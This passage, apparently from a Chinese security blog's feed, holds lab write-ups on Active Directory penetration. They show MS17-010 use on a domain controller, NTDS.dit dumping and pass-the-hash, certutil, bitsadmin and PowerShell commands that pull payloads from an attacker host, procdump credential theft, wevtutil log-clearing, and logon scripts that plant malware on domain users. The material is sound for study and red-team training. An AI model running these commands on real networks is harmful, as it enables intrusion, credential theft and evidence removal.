–&gt;  查找特权帐户等等等利用</li><li><a href="https://github.com/byt3bl33d3r/SILENTTRINITY" target="_blank" rel="noopener">SILENTTRINITY</a> –&gt;  后期利用</li><li>….</li></ul><p>除了以上这些点，还有很多方法，最无脑的就是查看当前用户具有读权限的域内所有共享，信息收集，翻一轮、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] powerview</span><br><span class="line">Find-DomainShare -CheckShareAccess | fl | Out-File domain-shares.txt</span><br><span class="line">[*] 略....</span><br></pre></td></tr></table></figure><h1 id="0x04-域控权限"><a href="#0x04-域控权限" class="headerlink" title="0x04 域控权限"></a>0x04 域控权限</h1><p><code>TTT-V_172.16.88.20</code>使用<code>MS17-010</code>成功执行命令。</p><p>域控信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">机器名: TTT-V</span><br><span class="line">权限: 域控权限</span><br><span class="line">系统: Windows Server 2016 Standard 10.0.14393 N/A Build 14393 x64</span><br><span class="line">OS Configuration: Additional/Backup Domain Controller</span><br><span class="line">Domain: rcoil.local</span><br><span class="line">IP地址: 172.16.88.20</span><br><span class="line">杀软: McAfee(非最新版)</span><br><span class="line">补丁情况：[*2]</span><br><span class="line">.NET版本：V1.0、V1.1、V2.0、V3.0、V3.5、V4.0</span><br><span class="line">端口情况：无Web --&gt; TTT-2_172.16.88.21存在80端口IIS服务</span><br><span class="line">域信任关系：rcoil.local（root）</span><br><span class="line">   demo.rcoil.local</span><br></pre></td></tr></table></figure><p>往下的思路是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] 本机flag获取</span><br><span class="line">[*] 在TTT-V机器上拖取NTDS.dit文件，本地恢复获取域内所有用户hash。当然，能获取到明文是最好的。</span><br><span class="line">[*] 使用CrackMapExec、wmiexec等工具执行相关操作（重点：以域管权限启动CS，后使用PTH攻击 --&gt; 简直完美）。</span><br></pre></td></tr></table></figure><h2 id="1）实施"><a href="#1）实施" class="headerlink" title="1）实施"></a>1）实施</h2><ul><li><p><strong>flag获取</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] dir</span><br><span class="line">dir /s flag</span><br><span class="line">[*] powerview(可选)</span><br><span class="line">Invoke-Filefinder -Threads 100 -Verbose -Terms flag -IncludeC -OutFile C:\Windows\Temp\flags.txt</span><br><span class="line"></span><br><span class="line">flag&#123;Genius_only_means_hard-working_all_one&apos;s_life&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>直接反弹<code>MS17-010</code>的shell进行操作</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bind_tcp --&gt; 失败</span><br><span class="line">bind_pipe --&gt; 失败</span><br></pre></td></tr></table></figure></li><li><p><strong>IPC操作</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] 不建议之操作</span><br><span class="line">添加添加系统隐藏账号密码进行IPC一系列操作</span><br><span class="line">[*] 域管权限</span><br><span class="line">直接从域控IPC到DKRST011进行工具复制 --&gt; 拒绝访问</span><br></pre></td></tr></table></figure></li><li><p><strong>NTDS.dit</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c: </span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\NTDS.dit c:\windows\temp\ntds.dit </span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM c:\windows\temp\system.hive</span><br><span class="line">vssadmin delete shadows /shadow=&#123;1xxxxx0b-e47d-xxxx-969f-8xxa4xxxx0xx&#125; /quiet</span><br><span class="line">最后通过 //172.16.88.21/SYSVOL 拖到 DKRST011 机器，本地恢复</span><br><span class="line">python secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL</span><br><span class="line"></span><br><span class="line">域管理员的password为hash格式。</span><br><span class="line"></span><br><span class="line">后使用 CrackMapExec、wmiexec等工具进行进一步测试。</span><br></pre></td></tr></table></figure><p><strong>注：</strong>调用<code>Volume Shadow Copy</code>服务会产生日志文件，位于System下，<code>Event ID为7036</code></p></li></ul><h2 id="2）遇到问题"><a href="#2）遇到问题" class="headerlink" title="2）遇到问题"></a>2）遇到问题</h2><p>执行以下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes LMHASH:NTHASH rcoil/administrator@172.16.238.29 &quot;c:\\payload.exe&quot;</span><br></pre></td></tr></table></figure></p><p><code>Cobalt Strike</code>未上线，这个情况其实是第一次见。</p><p>以多种形式的<code>payload</code>运行也无果。</p><p>确认非协议问题，因为以同样的程序，在域用户权限下正常启动并上线。</p><h2 id="3）方案"><a href="#3）方案" class="headerlink" title="3）方案"></a>3）方案</h2><ul><li>获取明文密码，计划任务启动；</li><li>添加<code>HKLM自启注册表</code></li></ul><h1 id="0x05-获取域管明文密码"><a href="#0x05-获取域管明文密码" class="headerlink" title="0x05 获取域管明文密码"></a>0x05 获取域管明文密码</h1><p>使用<code>powerview</code>查询域管登陆过的机器：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Find-DomainUserLocation == old Invoke-UserHunter</span><br><span class="line"># enumerate servers that allow unconstrained Kerberos delegation and show all users logged in</span><br><span class="line">Find-DomainUserLocation -ComputerUnconstrained -ShowAll</span><br></pre></td></tr></table></figure></p><p>最后选择了<code>172.16.10.29</code>的<code>win 2008 server</code>的机器，而且这台机器上存在<code>AdAudit Plus</code>。</p><p><img src="/image/内网练习（四）/blog_2019-03-25_16-37-30.png" alt="blog_2019-03-25_16-37-30"></p><p>由于目前没有任何容器可提供文件传输，所以自建。</p><ul><li><p>在<code>DKRST011</code>机器创建<code>FTP</code>或者<code>Web</code>服务；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import SimpleHTTPServer</span><br><span class="line">import SocketServer</span><br><span class="line">import sys</span><br><span class="line">PORT = 80</span><br><span class="line">if len(sys.argv) != 2:</span><br><span class="line">print(&quot;use: web.exe port&quot;)</span><br><span class="line">else: </span><br><span class="line">PORT = int(sys.argv[1])</span><br><span class="line">Handler = SimpleHTTPServer.SimpleHTTPRequestHandler</span><br><span class="line">httpd = SocketServer.TCPServer((&quot;&quot;, PORT), Handler)</span><br><span class="line">print &quot;SimpleHTTPServer is &quot;, PORT</span><br><span class="line">print &quot;by k8gege&quot;</span><br><span class="line">httpd.serve_forever()</span><br><span class="line">来源：https://raw.githubusercontent.com/k8gege/K8tools/master/web.py </span><br><span class="line">注：这类型操作也需要添加防火墙规则，防止弹窗</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;web.exe&quot; dir=in program=&quot;c:\Users\Public\Downloads\web.exe&quot; action=allow</span><br></pre></td></tr></table></figure></li><li><p>使用<code>certutil</code>、<code>bitsadmin</code>、<code>powersehll</code>等自带程序下载；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] certutil -urlcache -split -f  http://172.16.238.29/1.rar 2.rar</span><br><span class="line">[*] bitsadmin /rawreturn /transfer 任务名 http://172.16.238.29/1.rar 2.rar</span><br><span class="line">[*] powershell -WindowStyle Hidden &quot;IEX (New-Object Net.WebClient).DownloadFile(&apos;http://172.16.238.29/1.rar&apos;,&apos;c:\windows\temp\ 2.rar&apos;)&quot;</span><br></pre></td></tr></table></figure><p>这里有人就会问了，为什么不将需要使用的东西放入到域共享目录里面，原因是要操作的机器访问域共享提示无法访问。</p></li></ul><p>往下就是<code>Procdump</code>的一些操作，成功获取到明文密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] 高权限计划任务启动CS服务端，未上线。</span><br><span class="line">[*] 添加HKLM自启动，未上线。</span><br><span class="line"></span><br><span class="line">这是什么问题呢？（未解决）</span><br></pre></td></tr></table></figure><h1 id="0x05-其余flag获取"><a href="#0x05-其余flag获取" class="headerlink" title="0x05 其余flag获取"></a>0x05 其余flag获取</h1><p>从提示与目的来判断，剩下的<code>2个flag</code>位于<code>demo.rcoil.local域</code>的域控、域用户名为<code>flagav</code>的机器上。</p><ul><li><p><code>flagav</code>用户机器<br>直接从<code>AdAudit Plus</code>获取到域用户<code>flagav</code>的登陆情况，这样就不用去翻日志了。<br>使用<code>CrackMapExec</code>、<code>wmiexec</code>等工具执行命令查找flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Cease_to_struggle_and_you_cease_to_live&#125;</span><br></pre></td></tr></table></figure></li><li><p>子域域控flag</p></li></ul><p>使用主域控的域管可直接登陆子域的域控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Success_grows_out_of_struggles_to_overcome_difficulties&#125;</span><br></pre></td></tr></table></figure><h1 id="0x0x-最后的拓扑"><a href="#0x0x-最后的拓扑" class="headerlink" title="0x0x 最后的拓扑"></a>0x0x 最后的拓扑</h1><p>好多没去了解，就草草结束了。</p><p><img src="/image/内网练习（四）/网络拓扑.png" alt="网络拓扑"></p><p><strong>免责声明：</strong>文章中所提到的工具/教程，不得用于商业或非法用途，否则后果自负。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;环境为模拟环境，文章使用的均为公开测试工具且未涉及到各个方法的原理。&lt;/p&gt;
&lt;p&gt;分享便是我最好的老师。   ——Micropoor&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="系统安全" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】获取域环境内用户登录信息</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF/"/>
    <id>https://rcoil.me/2018/11/【域渗透】获取域环境内用户登录信息/</id>
    <published>2018-11-26T08:06:48.000Z</published>
    <updated>2018-11-27T03:31:50.019Z</updated>
    
    <content type="html"><![CDATA[<p>之前见到有人在讨论<a href="https://www.t00ls.net/viewthread.php?tid=47649&amp;extra=&amp;page=1" target="_blank" rel="noopener">域内用户在域内的机器ip怎么查呢</a>，集思广益，结合答复及自己的观点，总结了以下内容。<br><a id="more"></a></p><h2 id="0x00-adfind-未实践"><a href="#0x00-adfind-未实践" class="headerlink" title="0x00 adfind(未实践)"></a>0x00 adfind(未实践)</h2><p>有时候管理员会设置域用户只可以登录指定的的域内计算机，使用adfind或者powerview导出域用户信息可以查看；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看域内用户详细信息：</span><br><span class="line">adfind.exe -h DNS_SERVER_IP -sc u:username(目标用户)</span><br><span class="line"></span><br><span class="line">查看域内所有用户详细信息：</span><br><span class="line">AdFind.exe -h DNS_SERVER_IP -sc u:*</span><br><span class="line">详见：http://www.joeware.net/freetools/tools/adfind/usage.htm</span><br></pre></td></tr></table></figure></p><p>powerview在域内执行就可以。</p><h2 id="0x01-查看域内机器的用户目录文件夹"><a href="#0x01-查看域内机器的用户目录文件夹" class="headerlink" title="0x01 查看域内机器的用户目录文件夹"></a>0x01 查看域内机器的用户目录文件夹</h2><p>确定开机状态的计算机列表-建立连接-查看用户目录-断开连接，可以参考如下批处理：<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f "delims=" <span class="variable">%%i</span> <span class="keyword">in</span> (live.txt) <span class="keyword">DO</span> (</span><br><span class="line">        <span class="built_in">net</span> use \\<span class="variable">%%i</span>\C$ password /u:domain\domain_admins_user</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">errorlevel</span> <span class="number">1</span> (</span><br><span class="line">                <span class="keyword">for</span> /f "delims=" <span class="variable">%%j</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /od /b \\<span class="variable">%%i</span>\C$\users\') <span class="keyword">do</span> (</span><br><span class="line">                        <span class="built_in">echo</span> <span class="variable">%%i</span>:<span class="variable">%%j</span>&gt;&gt; test.log</span><br><span class="line">                )</span><br><span class="line">                <span class="built_in">net</span> use \\<span class="variable">%%i</span>\C$ /<span class="built_in">del</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>域管不用建立连接就可以访问域内计算机资源（未实践），因此以域管权限运行时可以参考如下批处理：<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f "delims=" <span class="variable">%%i</span> <span class="keyword">in</span> (live.txt) <span class="keyword">DO</span> (</span><br><span class="line">        <span class="keyword">for</span> /f "delims=" <span class="variable">%%j</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /od /b \\<span class="variable">%%i</span>\C$\users\') <span class="keyword">do</span> (</span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">%%i</span>:<span class="variable">%%j</span>&gt;&gt; test.log</span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><h2 id="0x02-域控日志"><a href="#0x02-域控日志" class="headerlink" title="0x02 域控日志"></a>0x02 域控日志</h2><p><code>wevtutil</code>为Windows 事件命令行实用程序，其导出的日志为evtx格式（即Windows日志本身的存储格式），可以使用Windows事件查看器分析，Crtl+F查找，或者不使用<code>epl</code>参数，直接重定向输出即可。<br><code>wevtutil</code>常用的场景是清理日志。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl application</span><br><span class="line">wevtutil cl security</span><br><span class="line">wevtutil cl system</span><br><span class="line">wevtutil cl &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure></p><p>而它也可作为筛选分析日志的工具。这里需要注意的几个ID分别为：4624（用户登陆成功）、4768、4776（用户账号验证成功）</p><font color="#0099ff" size="3">使用<code>wevtutil</code>结合python</font><ul><li><p>wevtutil</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe security /q:"Event[System[(EventID=<span class="number">4624</span> or EventID=<span class="number">4768</span> or EventID=<span class="number">4776</span>)]]" /f:text /<span class="built_in">rd</span>:true /c:<span class="number">1</span> &gt; EvtLogon.dat</span><br></pre></td></tr></table></figure></li><li><p>参数说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qe: 从日志或日志文件中查询事件；（默认xml格式显示）</span><br><span class="line">Security: 指定安全事件的日志；</span><br><span class="line">/q: 筛选规则，可以打开Windows事件查看器的筛选器配置筛选条件后转至XML复制筛选规则；</span><br><span class="line">/f: 以text格式显示</span><br><span class="line">/rd: 指定读取事件的方向</span><br><span class="line">/c: 指定个数</span><br><span class="line">该命令其它参数参考wevtutil /?</span><br></pre></td></tr></table></figure></li><li><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:utf-8 --</span></span><br><span class="line"><span class="comment"># Python v2.7.10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">evt = <span class="string">'EvtLogon.dat'</span></span><br><span class="line">fevt = open(evt,<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># For Eliminate redundancies</span></span><br><span class="line">    lastdate = <span class="string">'lastdate'</span></span><br><span class="line">    lasttask = <span class="string">'lasttask'</span></span><br><span class="line">    <span class="comment"># 因为windows下的换行符问题，导致写的文件会有空行，使用二进制模式打开</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'LogonStat.csv'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">        csv_write = csv.writer(csvfile)</span><br><span class="line">        csv_write.writerow([<span class="string">"Task"</span>, <span class="string">"Date"</span>, <span class="string">"Account Name"</span>, <span class="string">"Account Domain"</span>, <span class="string">"Logon Address"</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> eachline <span class="keyword">in</span> fevt:</span><br><span class="line">            <span class="keyword">if</span> eachline.find(<span class="string">'Event['</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                task = <span class="string">''</span></span><br><span class="line">                date = <span class="string">''</span></span><br><span class="line">                accname = <span class="string">''</span></span><br><span class="line">                logontype = <span class="string">''</span></span><br><span class="line">                logonaddr = <span class="string">''</span></span><br><span class="line">                skip = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Date:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                date = eachline[(eachline.find(<span class="string">':'</span>)+<span class="number">1</span>):].strip()</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Task:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                task = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">if</span> (date == lastdate) <span class="keyword">and</span> (task == lasttask): <span class="comment">## reduce</span></span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lastdate = date</span><br><span class="line">                    lasttask = task</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Account Name:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                accname = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">if</span> (task == <span class="string">'Logon'</span>) <span class="keyword">and</span> (accname.find(<span class="string">'$'</span>) &gt; <span class="number">-1</span>): <span class="comment">## reduce</span></span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Account Domain:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                accdomain = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Source Network Address:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                logonaddr = eachline[(eachline.find(<span class="string">':'</span>)+<span class="number">1</span>):].strip()</span><br><span class="line">                <span class="keyword">if</span> logonaddr == <span class="string">'-'</span>:</span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> (skip == <span class="number">0</span>) <span class="keyword">and</span> (task == <span class="string">'Logon'</span>):</span><br><span class="line">                    LogonStat = [[task, date, accname, accdomain, logonaddr]]</span><br><span class="line">                    csv_write.writerows(LogonStat)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Error: %s'</span> % e</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fevt.close()</span><br><span class="line">csvfile.close()</span><br></pre></td></tr></table></figure></li></ul><p>PS: 筛选条件还有很多，都可以组合利用，从而筛选出自己所需要的信息。<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe Security /q:"*[EventData[Data[@Name='LogonType']='<span class="number">10</span>'] and EventData[Data[@Name='TargetUserName']='RcoIl'] and System[(EventID=<span class="number">4624</span>) and TimeCreated[timediff(@SystemTime) &amp;lt;= <span class="number">2592000000</span>]]]"</span><br><span class="line"></span><br><span class="line">wevtutil qe Security /q:"*[System[(Keywords='<span class="number">0</span>x8020000000000000')] and EventData[Data[@Name='SubjectUserName']='RcoIl']]" /f:text /<span class="built_in">rd</span>:true /c:<span class="number">2</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-【参考】"><a href="#0x03-【参考】" class="headerlink" title="0x03 【参考】"></a>0x03 【参考】</h2><p><a href="http://cate4cafe.com/2018/11/21/wevtutil%E7%AD%9B%E9%80%89windows%E6%97%A5%E5%BF%97%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C/" target="_blank" rel="noopener">wevtutil筛选windows日志查询结果</a><br><a href="https://blog.csdn.net/dearggae/article/details/70147511" target="_blank" rel="noopener">[Tools]获取域环境内所有用户登录信息（附源码及程序）</a><br><a href="https://www.t00ls.net/viewthread.php?tid=47649&amp;extra=&amp;page=1" target="_blank" rel="noopener">域内用户在域内的机器ip怎么查呢？</a><br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd337721(v%3dws.10)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd337721(v%3dws.10)</a><br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前见到有人在讨论&lt;a href=&quot;https://www.t00ls.net/viewthread.php?tid=47649&amp;amp;extra=&amp;amp;page=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;域内用户在域内的机器ip怎么查呢&lt;/a&gt;，集思广益，结合答复及自己的观点，总结了以下内容。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9C%A8%E5%9F%9F%E6%8E%A7%E4%B8%8A%E4%BD%BF%E7%94%A8cmd%E6%9B%B4%E6%94%B9%E5%9F%9F%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/"/>
    <id>https://rcoil.me/2018/11/【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本/</id>
    <published>2018-11-16T08:33:21.000Z</published>
    <updated>2018-12-14T06:36:44.982Z</updated>
    
    <content type="html"><![CDATA[<p><font color="#DC143C" size="3">摘要：</font>采取直接的手段不能够解决问题，只好曲线救国。<br><a id="more"></a><br>声明：只是作为搬运工。</p><h2 id="0x00-利用场景"><a href="#0x00-利用场景" class="headerlink" title="0x00 利用场景"></a>0x00 利用场景</h2><ul><li><p>利用前置条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域管理员权限</span><br></pre></td></tr></table></figure></li><li><p>使用场合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">知道目标域用户名称，探测不到域用户对应机器名或IP；</span><br><span class="line">知道目标机器IP，但是无法通往上控；</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x01-利用方法"><a href="#0x01-利用方法" class="headerlink" title="0x01 利用方法"></a>0x01 利用方法</h2><p><font color="#DC143C" size="3">PS：</font>以下测试全部在域控上执行</p><h3 id="一）使用dsmod给指定域用户设置登陆脚本"><a href="#一）使用dsmod给指定域用户设置登陆脚本" class="headerlink" title="一）使用dsmod给指定域用户设置登陆脚本"></a>一）使用dsmod给指定域用户设置登陆脚本</h3><p>test.bat放在域控的NETLOGON目录下面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.bat</span><br><span class="line">dsmod user -loscr &quot;test.bat&quot; &quot;CN=x,OU=x,DC=x,DC=x,DC=x&quot;</span><br></pre></td></tr></table></figure></p><p>测试结果：<br>PS: 测试机为<code>Win-XP x86</code>，第二次注销重新登陆bat脚本才执行，bat内容为<a href="mailto:`@calc.exe" target="_blank" rel="noopener">`@calc.exe</a>`。<br><img src="/image/在域控上使用cmd更改域用户配置文件中的登录脚本/blog_2018-11-16_18-18-23.png" alt=""></p><h3 id="二）登陆脚本给指定用户种马"><a href="#二）登陆脚本给指定用户种马" class="headerlink" title="二）登陆脚本给指定用户种马"></a>二）登陆脚本给指定用户种马</h3><p>test.bat放在域控的NETLOGON目录下面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.bat</span><br><span class="line">net user xp /scriptpath:test.bat # 内网域成员机器可以使用</span><br><span class="line">gpupdate /force  # 立即刷新组策略 使用域管权限执行  不执行也行,等待随机</span><br></pre></td></tr></table></figure></p><p>测试结果与第一种方法一致</p><h3 id="三）使用PowerShell的Active-Directory模块"><a href="#三）使用PowerShell的Active-Directory模块" class="headerlink" title="三）使用PowerShell的Active Directory模块"></a>三）使用PowerShell的Active Directory模块</h3><p><code>ActiveDirectory.psd1</code>项目：<a href="https://github.com/samratashok/ADModule" target="_blank" rel="noopener">ADModule</a><br>命令：<br><figure 